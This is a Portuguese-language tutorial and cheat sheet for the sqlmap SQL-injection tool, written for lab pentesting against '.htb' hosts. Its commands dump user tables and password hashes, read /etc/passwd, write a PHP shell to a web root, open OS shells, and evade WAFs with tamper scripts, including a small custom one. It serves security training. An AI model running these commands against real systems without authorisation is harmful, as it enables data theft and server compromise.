---
title: "sqlmap"
---

# SQLMap - Guia Completo

## O que é o SQLMap e Para Que Serve

SQLMap é a ferramenta padrão de automação de SQL Injection em pentests profissionais. Ela resolve um problema prático: testar e explorar SQL Injection manualmente é um processo lento e repetitivo, especialmente em variantes blind onde cada caractere de cada dado exige dezenas de requisições HTTP individuais.

Internamente, o SQLMap funciona como um motor de inferência: ele envia payloads de detecção contra cada parâmetro da requisição, analisa as respostas para identificar variações de comportamento (diferença de conteúdo, timing, erros), determina qual técnica de injeção funciona, e então executa a extração usando algoritmos otimizados de bisseção e operações bit a bit.

O que manualmente levaria horas — especialmente blind SQLi onde cada bit de cada caractere requer uma requisição — o SQLMap faz em minutos usando paralelismo e estratégias de busca inteligentes. Para além da extração de dados, o SQLMap suporta escalação para execução de comandos no sistema operacional (via `xp_cmdshell` no MSSQL, UDFs no MySQL) e leitura/escrita de arquivos no servidor.

**Quando usar:** sempre que um parâmetro suspeito de SQLi precisar ser confirmado e explorado de forma eficiente. Para descoberta manual ou situações onde o contexto é muito específico (encoding customizado, autenticação complexa, lógica de aplicação não-standard), o trabalho manual continua sendo necessário — mas o SQLMap serve para a maior parte dos casos.

---

## Detecção Automática: Fingerprint de DBMS e Seleção de Técnica

SQLMap testa parâmetros com uma série de payloads de detecção para cada técnica (Boolean, Error, Union, Stacked, Time, Inline). Quando detecta que um parâmetro é vulnerável:

1. Faz fingerprint do DBMS (MySQL, MSSQL, PostgreSQL, Oracle, etc.)
2. Verifica permissões do usuário atual
3. Oferece funções de extração baseadas no DBMS detectado

### Técnicas Suportadas (flag `--technique`)

| Código | Nome | Quando Usar |
|--------|------|-------------|
| B | Boolean-based blind | Resposta diferente para true/false |
| E | Error-based | App mostra erros SQL |
| U | Union-based | App exibe dados da query |
| S | Stacked queries | App executa múltiplas queries |
| T | Time-based blind | Delay na resposta revela true/false |
| Q | Inline queries | Subquery na query original |

---

## Na Prática

### Configuração Inicial

```bash
# Instalar (Kali já vem instalado)
apt install sqlmap

# Verificar versão
sqlmap --version

# Atualizar para versão mais recente
sqlmap --update
```

### Fluxo de Trabalho Típico

```bash
# 1. Detectar vulnerabilidade
sqlmap -u "http://alvo.htb/page?id=1"

# 2. Fingerprint + informações básicas
sqlmap -u "http://alvo.htb/page?id=1" --banner --current-user --current-db --is-dba

# 3. Enumerar bancos
sqlmap -u "http://alvo.htb/page?id=1" --dbs

# 4. Enumerar tabelas do banco alvo
sqlmap -u "http://alvo.htb/page?id=1" -D nome_banco --tables

# 5. Enumerar colunas da tabela interessante
sqlmap -u "http://alvo.htb/page?id=1" -D nome_banco -T users --columns

# 6. Dump dos dados
sqlmap -u "http://alvo.htb/page?id=1" -D nome_banco -T users --dump
```

---

## Payloads e Exemplos

### Alvos de Input

```bash
# Parâmetro GET
sqlmap -u "http://alvo.htb/search?q=1&page=2"

# Parâmetro POST
sqlmap -u "http://alvo.htb/login" --data="username=admin&password=test"

# Cookie
sqlmap -u "http://alvo.htb/profile" --cookie="session=abc123; user=admin"

# Header HTTP
sqlmap -u "http://alvo.htb/" -H "User-Agent: test" --level=3
# nível 3+ testa headers automaticamente

# Header customizado específico
sqlmap -u "http://alvo.htb/" --headers="X-Forwarded-For: 1*"
# * marca o ponto de injeção

# Request salvo do Burp Suite
sqlmap -r /tmp/request.txt

# Request com ponto de injeção marcado (*)
# No arquivo, marcar com * onde injetar:
# GET /page?id=1* HTTP/1.1
sqlmap -r /tmp/request.txt

# JSON body
sqlmap -u "http://alvo.htb/api" --data='{"id": "1"}' --headers="Content-Type: application/json"

# XML body
sqlmap -u "http://alvo.htb/api" --data='<root><id>1</id></root>'
```

### Especificar Parâmetro e Técnica

```bash
# Testar apenas parâmetro específico
sqlmap -u "http://alvo.htb/search?q=1&page=2" -p q

# Especificar técnicas
sqlmap -u "http://alvo.htb/page?id=1" --technique=U       # só UNION
sqlmap -u "http://alvo.htb/page?id=1" --technique=BT      # boolean + time
sqlmap -u "http://alvo.htb/page?id=1" --technique=BEUSTQ  # tudo

# Forçar DBMS (pular fingerprint)
sqlmap -u "http://alvo.htb/page?id=1" --dbms=mysql
sqlmap -u "http://alvo.htb/page?id=1" --dbms=mssql
sqlmap -u "http://alvo.htb/page?id=1" --dbms=postgresql

# Forçar OS
sqlmap -u "http://alvo.htb/page?id=1" --os=linux
sqlmap -u "http://alvo.htb/page?id=1" --os=windows
```

### Tuning de Agressividade

```bash
# Level e Risk
# level: 1-5 (quantos testes, headers testados)
# risk: 1-3 (quão perigosos os payloads, risk=3 pode modificar dados)

sqlmap -u "http://alvo.htb/page?id=1" --level=5 --risk=3

# Nível 1 (padrão): testa parâmetros GET/POST básicos
# Nível 2: testa cookies
# Nível 3: testa User-Agent, Referer
# Nível 4+: testa mais headers
# Nível 5: testa tudo incluindo Host

# Risk 1 (padrão): payloads seguros
# Risk 2: adiciona queries baseadas em tempo
# Risk 3: adiciona OR-based (pode modificar dados!)
```

### Extração de Dados

```bash
# Informações do servidor/banco
sqlmap -u "http://alvo.htb/page?id=1" \
  --banner \          # versão do DBMS
  --current-user \    # usuário atual
  --current-db \      # banco atual
  --is-dba            # é DBA?

# Listar todos os bancos
sqlmap -u "http://alvo.htb/page?id=1" --dbs

# Listar tabelas
sqlmap -u "http://alvo.htb/page?id=1" --tables
sqlmap -u "http://alvo.htb/page?id=1" --tables -D nome_banco

# Listar colunas
sqlmap -u "http://alvo.htb/page?id=1" --columns
sqlmap -u "http://alvo.htb/page?id=1" --columns -T users
sqlmap -u "http://alvo.htb/page?id=1" --columns -T users -D nome_banco

# Schema completo de todos os bancos
sqlmap -u "http://alvo.htb/page?id=1" --schema

# Dump de tabela específica
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users -D nome_banco

# Dump de colunas específicas
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users -D nome_banco -C "username,password,email"

# Dump tudo (excluir bancos de sistema)
sqlmap -u "http://alvo.htb/page?id=1" --dump-all --exclude-sysdbs

# Buscar por nome de tabela
sqlmap -u "http://alvo.htb/page?id=1" --search -T user
sqlmap -u "http://alvo.htb/page?id=1" --search -T "pass"

# Buscar por nome de coluna
sqlmap -u "http://alvo.htb/page?id=1" --search -C password
sqlmap -u "http://alvo.htb/page?id=1" --search -C "credit"
```

### Paginação e Filtros no Dump

```bash
# Dump apenas linhas 2-5
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --start=2 --stop=5

# Dump com filtro WHERE
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --where="username LIKE 'a%'"
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --where="id > 100"

# Não confirmar prompts (modo automático)
sqlmap -u "http://alvo.htb/page?id=1" --batch --dump -T users

# Aceitar padrões e não perguntar nada
sqlmap -u "http://alvo.htb/page?id=1" --batch
```

### Debug e Troubleshooting

```bash
# Verbosidade (0-6)
# 0: mínimo
# 1: padrão  
# 2: mostrar payloads
# 3: mostrar HTTP
# 4: mostrar requests HTTP
# 5: mostrar headers de resposta
# 6: tudo

sqlmap -u "http://alvo.htb/page?id=1" -v 3
sqlmap -u "http://alvo.htb/page?id=1" -v 6

# Mostrar erros SQL na resposta
sqlmap -u "http://alvo.htb/page?id=1" --parse-errors

# Salvar log em arquivo
sqlmap -u "http://alvo.htb/page?id=1" -t /tmp/sqli_traffic.log

# Usar proxy para inspecionar no Burp
sqlmap -u "http://alvo.htb/page?id=1" --proxy="http://127.0.0.1:8080"

# Ignorar certificado SSL
sqlmap -u "https://alvo.htb/page?id=1" --proxy="http://127.0.0.1:8080" --ignore-proxy-error

# Threads (acelerar, mas pode triggar rate-limiting)
sqlmap -u "http://alvo.htb/page?id=1" --threads=10

# Delay entre requests
sqlmap -u "http://alvo.htb/page?id=1" --delay=2

# Timeout por request
sqlmap -u "http://alvo.htb/page?id=1" --timeout=30
```

### Prefix/Suffix para Ajuste de Payload

Quando a query tem contexto específico (parênteses, aspas extras, etc.):

```bash
# Query original: SELECT * FROM users WHERE id=('INJECT')
sqlmap -u "http://alvo.htb/page?id=1" --prefix="'" --suffix="-- -"
# Payload: id='INJECT'-- -

# Query original: SELECT * FROM users WHERE id=(INJECT) ORDER BY id
sqlmap -u "http://alvo.htb/page?id=1" --suffix=" LIMIT 1"

# Query original: SELECT * FROM users WHERE (username='INJECT')
sqlmap -u "http://alvo.htb/page?id=1" --prefix="'" --suffix=")-- -"
```

### Cracking de Hashes

SQLMap pode tentar crackear hashes extraídos automaticamente:

```bash
# Crackear hashes encontrados no dump
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --passwords

# Usar wordlist customizada
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --passwords --wordlist=/usr/share/wordlists/rockyou.txt

# Forçar formato de hash
sqlmap -u "http://alvo.htb/page?id=1" --dump -T users --passwords --hash-type=md5
```

---

## Automação

### Uso com Burp Request File

```bash
# 1. Interceptar request no Burp
# 2. Right-click > Save item
# 3. Usar com sqlmap

sqlmap -r /tmp/burp_request.txt

# Especificar parâmetro a testar
sqlmap -r /tmp/burp_request.txt -p username

# Se POST com JSON
sqlmap -r /tmp/burp_request.txt --data='{"user":"*"}'
# * marca o ponto de injeção
```

### Sessões e Cache

```bash
# SQLMap salva resultados em ~/.local/share/sqlmap/output/
ls ~/.local/share/sqlmap/output/

# Retomar sessão anterior (não re-detecta)
sqlmap -u "http://alvo.htb/page?id=1" --resume

# Limpar sessão e recomeçar
sqlmap -u "http://alvo.htb/page?id=1" --fresh-queries

# Flush sessão de um alvo
sqlmap -u "http://alvo.htb/page?id=1" --flush-session
```

### UNION-based - Ajuste Manual

```bash
# Forçar número de colunas UNION
sqlmap -u "http://alvo.htb/page?id=1" --union-cols=6

# Forçar caractere para preencher colunas NULL
sqlmap -u "http://alvo.htb/page?id=1" --union-char=1

# Forçar tabela para UNION FROM
sqlmap -u "http://alvo.htb/page?id=1" --union-from=users
```

### RCE e File Operations

```bash
# Ler arquivo do sistema (se permissão)
sqlmap -u "http://alvo.htb/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://alvo.htb/page?id=1" --file-read="C:\\Windows\\win.ini"

# Escrever arquivo (MySQL)
sqlmap -u "http://alvo.htb/page?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# OS shell interativo (MSSQL via xp_cmdshell, MySQL via UDF)
sqlmap -u "http://alvo.htb/page?id=1" --os-shell

# SQL shell interativo
sqlmap -u "http://alvo.htb/page?id=1" --sql-shell

# Executar comando específico
sqlmap -u "http://alvo.htb/page?id=1" --os-cmd="whoami"
```

### Conexão Direta ao Banco

```bash
# Conectar ao banco diretamente (se credenciais obtidas)
sqlmap -d "mysql://root:password@192.168.1.10:3306/alvo" --dump-all

# MSSQL via impacket-mssqlclient
impacket-mssqlclient -p 1433 -windows-auth DOMAIN/user:pass@TARGET_IP

# PostgreSQL
psql -h TARGET_IP -U postgres -d nome_banco

# MySQL
mysql -h TARGET_IP -u root -p
```

---

## Bypass de WAF com SQLMap

### Tamper Scripts

```bash
# Listar todos tampers disponíveis
sqlmap --list-tampers

# Tampers mais usados para WAF bypass
sqlmap -u "http://alvo.htb/page?id=1" --tamper=space2comment
# SELECT * FROM → SELECT/**/*//**/FROM

sqlmap -u "http://alvo.htb/page?id=1" --tamper=between
# > → NOT BETWEEN 0 AND  

sqlmap -u "http://alvo.htb/page?id=1" --tamper=randomcase
# SELECT → SeLeCt

sqlmap -u "http://alvo.htb/page?id=1" --tamper=charencode
# URL encode caracteres

sqlmap -u "http://alvo.htb/page?id=1" --tamper=charunicodeencode
# Unicode encode

sqlmap -u "http://alvo.htb/page?id=1" --tamper=base64encode
# base64 encode o payload

sqlmap -u "http://alvo.htb/page?id=1" --tamper=equaltolike
# = → LIKE

sqlmap -u "http://alvo.htb/page?id=1" --tamper=greatest
# > N → GREATEST(N+1,val)

sqlmap -u "http://alvo.htb/page?id=1" --tamper=ifnull2ifisnull
# IFNULL → IF(ISNULL

sqlmap -u "http://alvo.htb/page?id=1" --tamper=modsecurityversioned
# /* versioned */ nos comentários

# Combinar múltiplos tampers
sqlmap -u "http://alvo.htb/page?id=1" \
  --tamper=between,randomcase,space2comment,charencode \
  --random-agent \
  --level=5 --risk=3
```

### Estratégia WAF Bypass Completa

```bash
# 1. Tentar primeiro sem tampers para baseline
sqlmap -u "http://alvo.htb/page?id=1" -v 3

# 2. Se bloqueado, identificar o WAF
wafw00f http://alvo.htb

# 3. Usar tampers específicos para o WAF identificado
# ModSecurity: --tamper=modsecurityversioned,modsecurityzeroversioned
# Cloudflare: --tamper=between,charencode,randomcase
# Imperva: --tamper=between,charencode,space2comment

# 4. User-Agent aleatório (evitar fingerprint do SQLMap)
sqlmap -u "http://alvo.htb/page?id=1" --random-agent

# 5. Delay entre requests
sqlmap -u "http://alvo.htb/page?id=1" --delay=3 --random-agent

# 6. Forçar single-thread (menos noise)
sqlmap -u "http://alvo.htb/page?id=1" --threads=1

# 7. Script de tamper customizado
# Criar em ~/.sqlmap/tamper/custom.py
```

### Criar Tamper Script Customizado

```python
# ~/.sqlmap/tamper/mytamper.py
#!/usr/bin/env python3
"""
Tamper script que substitui espaços por /**/ e UNION por uNiOn
"""
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace(" ", "/**/")
        payload = payload.replace("UNION", "uNiOn")
        payload = payload.replace("SELECT", "sElEcT")
    return payload
```

```bash
# Usar tamper customizado
sqlmap -u "http://alvo.htb/page?id=1" --tamper=mytamper
```

---

## Referência Rápida - Flags Mais Usadas

| Flag | Função |
|------|--------|
| `-u URL` | URL alvo |
| `-r file` | Request file do Burp |
| `-p param` | Parâmetro específico |
| `--data="..."` | POST body |
| `--cookie="..."` | Cookies |
| `--headers="..."` | Headers HTTP |
| `--batch` | Não perguntar nada |
| `--level=N` | Nível de teste (1-5) |
| `--risk=N` | Risco dos payloads (1-3) |
| `--technique=X` | Técnicas (BEUSTQ) |
| `--dbms=X` | Forçar DBMS |
| `--dbs` | Listar bancos |
| `--tables` | Listar tabelas |
| `--columns` | Listar colunas |
| `--dump` | Dump dados |
| `--dump-all` | Dump tudo |
| `--schema` | Schema completo |
| `--search -T x` | Buscar tabela |
| `--search -C x` | Buscar coluna |
| `--banner` | Versão DBMS |
| `--current-user` | Usuário atual |
| `--current-db` | Banco atual |
| `--is-dba` | É DBA? |
| `--passwords` | Hashes de usuários |
| `--os-shell` | Shell no SO |
| `--os-cmd="x"` | Executar comando |
| `--file-read` | Ler arquivo |
| `--file-write` | Escrever arquivo |
| `--tamper=x` | Tamper scripts |
| `--random-agent` | User-Agent aleatório |
| `--proxy=URL` | Usar proxy |
| `--threads=N` | Threads paralelas |
| `--delay=N` | Delay em segundos |
| `-v N` | Verbosidade (0-6) |
| `-t file` | Log de traffic |
| `--parse-errors` | Mostrar erros SQL |
| `--union-cols=N` | Colunas UNION |
| `--prefix="x"` | Prefixo payload |
| `--suffix="x"` | Sufixo payload |
| `--start=N` | Offset dump |
| `--stop=N` | Limite dump |
| `--where="..."` | Filtro WHERE dump |
| `--exclude-sysdbs` | Excluir sys DBs |
| `--flush-session` | Limpar cache |
| `--resume` | Retomar sessão |

---

## Módulos Relacionados

Para usar o SQLMap com eficácia é necessário entender o que ele está explorando — os fundamentos estão em [`01_sqli_fundamentos.md`](01_sqli_fundamentos.md). Os algoritmos de extração boolean e time-based que o SQLMap implementa automaticamente são explicados manualmente em [`02_sqli_blind_e_avancado.md`](02_sqli_blind_e_avancado.md). Quando o SQLMap é bloqueado por WAFs, os tamper scripts descritos aqui se complementam com as técnicas manuais de obfuscação cobertas em [`05_sqli_waf_bypass.md`](05_sqli_waf_bypass.md).
